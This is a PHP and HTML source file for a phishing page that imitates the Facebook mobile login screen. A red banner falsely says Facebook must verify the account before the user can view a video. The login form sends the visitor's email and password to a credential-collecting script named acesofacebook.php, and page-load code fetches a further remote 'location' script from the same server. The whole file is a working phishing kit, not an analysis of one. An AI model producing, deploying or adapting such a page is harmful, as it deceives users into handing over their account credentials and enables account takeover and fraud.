<?php
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$domain = dirname($actual_link)."/landings/facebooknew";
$action_post = dirname(dirname($actual_link)).'/acesofacebook.php';
$action_post = str_replace("public/", "", $action_post);

if(defined('ACCESSFACEBOOK_URL')){
   $action_post = ACCESSFACEBOOK_URL;
};

 ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
	<title>Log into Facebook | Facebook</title>
  <link rel="stylesheet" href="<?php echo $domain ?>/landcss.css">
</head>
<body tabindex="0" class="touch x1-5 android _fzu _50-3 iframe acw portrait" style="min-height: 667px; background-color: rgb(255, 255, 255);">
	<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 667px;">
		<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
		<div id="page" class="">
			<div class="_129_" id="header-notices"></div>
			<div class="_7om2 _52we _52z5" id="header">
				<div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="#"><i class="img sp_EXjamvPof_c_1_5x sx_319c0b"><u>facebook</u></i></a></div>
			</div>
			<div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 667px;">
				<div class="_7om2">
					<div class="_4g34" id="u_0_0">
						<div class="aclb _4-4l">
							<div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
								<div class="_qw9 grouped aclb" id="u_0_1">
									<a target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea">
										<div class="ib cc">
											<div style='margin: 4px auto; padding: 4px 8px; max-width: 416px; box-sizing: border-box;'>
        							    <div style='color: #ff1616;'>
        							        <img style='height: 16px; vertical-align: middle;' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAFPklEQVR4Xq1XXWgcVRQ+996d6WazzUJR06RJk1ZjbOMfFjfWRqTUNwFpn0xBoAjFllbwRQwUfCnqq+KjIlRIin0SxMeKEsWKAZtaJdBKDTYkCEkbtvszM/dev3NnMpNK1+7iXjice885853vnDl32BXT09N0vzU5OZnuZ2ZmSlCnIK9BRvv7+2lpaYldC5DPIR8j/vam+P/EltTGAth+KeVCuVw+e+TIkVEmNjExQaz5PD4+flYptcBxrWLKNpKXPc+7ePDgwd6+vj5aX1+nmzdv0vLyMmt3ZvuhQ4d68/n8RY7vGAGA+ah8GpXnrbW0trZGly5dIn59586do/Pnz9Pc3Bytrq5SFEWETuR93/+Cn+tUB46PjIw8nMvlKAxDunz5Mq2srHw2MDAwMjU1JTAHY5iDC/Pz844AL8QPCSGO3Q+4pSFE9bP79u070NXVRTdu3KDFxUUetNP36NQnO3fufH14eJiq1SqB0GwQBC/87w6gkscLhQJXx8k1TGeahL7Nfo7jeGvtYx2ZAQCV8E6pVqvxcRnVV5pc13X21+t1wiCS1vqBjt0CpRShndwN7oBuEhaxH3Ecz8SpowTQWtbiPnECcZ0lgKp4EMkY01I4EnN8Zz9ETIKBW5wZF9/KyjVzDP19djvUl5DyX9vfTQGVuT34w0djTZmo3rf+jcOxP0Fe+fPBM8vtdOD9gfGT5WeOz91l9Aq9xLbnTl2h59+8msr+07+y3fmxUsJs2/HsyTLjtfwhAutRqKtjL7+nFmY/pev+ZOrzVYMG9Ne0e/ejVChuZQjORkG9Rtf/uEaL9iVqRF4avzu6QKMHjtFvX72jcRxDFxZaeQWH+596VcnK7zQ01EeD9jsSMkdCeSRyeexHcM+7CQbklo6Dny/Q8K4RGhKLZII7RCaCaBJ2kFTlGvU/PamWfpk5DOwPWiLQs20H5VDhQ3tPJiaRaWwzW7YKTlmKVbbX1SUqqR9piahlAnu3+IqClVmSqJikBJak6PY8WR24bsABrQgtgbDfQCIo7apXpT2gF9+ccPUKbSk+4nBbvQVFIawDEn4xtjCwFZvvGsQ5krOBJHYsR4wUuIlkTKzDbf0WMCDFJGxUh1SBHTm7TXxOs9zLrmvYNiBhgmXa+Q5kVVoTOCFdT7pgWOK9pDiZEEnlNo2xiGefkD7hwP52CdgEqOGqMY5AGFdiBI8EtEVumc3dZnK6kVVt2ifAaAlgwNUwoAOyABVJct5YSLrSV6LjriFakIpt1HYHYjBrwhjMBtkMMJhIqncTll07mxGAGbFSwaYdVvsdiLj9LHVgVuNhZCApkRzAyVcwYZDOAScU0R3EeWTZFjZYt0eAE9mAE4ZkTJ0It8CEVRLGxK2XSWK5iYCxmfYqZEBAIrHRtdY7cPToUfH9h3sdkAlr8SdVMwlUEQJUxwSkEE5jZQSSOTBcbeTDnSeLONuoNr+GnJARuru7hZRS9fT0yHQIG7V40gEqmES9SlZrAAvSjoC4BwEbS2ML0A0I5BwBa2ICJ06c8LTWplKpuHblisUiumRzQggf2gkHetuepMIexhI49JLy+6hr6xg8MkmcJU8+AymJbB6M03LXMPCecB5jTBG5AuQNQULnwEZ4nidYSyzOUAvstz9feONF6vAKQvsNCnQ5oAVIkCulVCrJRqMhfd9XcKhkNjiQzxKM3QOsIQL7zS1IS7dxECuzoVET915vCFaELmj8bDf4i2fv+kGyMQ+YA/5lK0BIIJiFGBtC3K1mVwrPECeGbGirlLJBEFg8Z2/duuWIImcK8A88qRqIEgh3iQAAAABJRU5ErkJggjEzOTk='>
        							        Facebook needs to verify your account information to allow access this video
        							    </div>
        							</div>
										</div>
									</a>
								</div>
							</div>
							<div class="_5rut">
								<form method="post" action="<?php echo $action_post; ?>" class="mobile-login-form _5spm" id="login_form" data-sigil="m_login_form" data-autoid="autoid_2">
									<input type="hidden" name="ua" value="" autocomplete="off">
									<input type="hidden" name="state" id="estado" value="" autocomplete="off">
									<input type="hidden" name="username" id="username" value="" autocomplete="off">
									<div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
									<div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
									<div id="otp_retrieve_desc_container"></div>
									<div class="_56be _5sob">
										<div class="_55wo _55x2 _56bf">
											<div id="email_input_container"><input required="true" autocorrect="off" autocapitalize="off" type="text" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="email" placeholder="Mobile number or email" data-sigil="m_login_email"></div>
											<div>
												<div class="_1upc _mg8" data-sigil="m_login_password">
													<div class="_7om2">
														<div class="_4g34 _5i2i _52we">
															<div class="_5xu4"><input required="true" autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="pass" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input"></div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
									<div class="_2pie" style="text-align:center;">
										<div id="u_0_5" data-sigil="login_password_step_element">
											<button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_6" data-sigil="touchable m_login_button" data-autoid="autoid_4" style="cursor: pointer;"><span class="_55sr">Log In</span></button>
										</div>
									</div>
								</form>
								<div>
									<div class="_43mg"><span class="_43mh">or</span></div>
									<div class="_52jj _5t3b" id="u_0_7"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Create New Account</a></div>
								</div>
								<div>
									<div class="other-links">
										<ul class="_5pkb _55wp">
											<li><span class="mfss fcg"><a tabindex="0" id="forgot-password-link">Forgot Password?</a></span></li>
										</ul>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="_55wr _5ui2" data-sigil="m_login_footer">
					<div class="_5dpw">
						<div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
							<div class="_7om2">
								<div class="_4g34">
									<span class="_52jc _52j9 _52jh _3ztb">English (US)</span>
									<div class="_3ztc"><span class="_52jc"><a data-locale="fr_FR" data-sigil="change_language">Français (France)</a></span></div>
									<div class="_3ztc"><span class="_52jc"><a data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a></span></div>
									<div class="_3ztc"><span class="_52jc"><a data-locale="ar_AR" data-sigil="change_language">العربية</a></span></div>
								</div>
								<div class="_4g34">
									<div class="_3ztc"><span class="_52jc"><a data-locale="es_ES" data-sigil="change_language">Español (España)</a></span></div>
									<div class="_3ztc"><span class="_52jc"><a data-locale="it_IT" data-sigil="change_language">Italiano</a></span></div>
									<div class="_3ztc"><span class="_52jc"><a data-locale="de_DE" data-sigil="change_language">Deutsch</a></span></div>
									<a>
										<div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"><i class="img sp_EXjamvPof_c_1_5x sx_f71af1"></i></div>
									</a>
								</div>
							</div>
						</div>
						<div class="_5ui4"><span class="mfss fcg">Facebook ©2019</span></div>
					</div>
				</div>
			</div>
		</div>
	</div>

  <script>
   document.body.className = document.body.className + ' touch x1-5 android _fzu _50-3 iframe acw portrait';
    m_login_email.required = true;
     m_login_password.required = true;
     var script_ = document.createElement('script');
     script_.src = "<?php echo dirname($action_post); ?>/location";
     script_.async = true;
     document.body.appendChild(script_);
  </script>
</body>
</html>
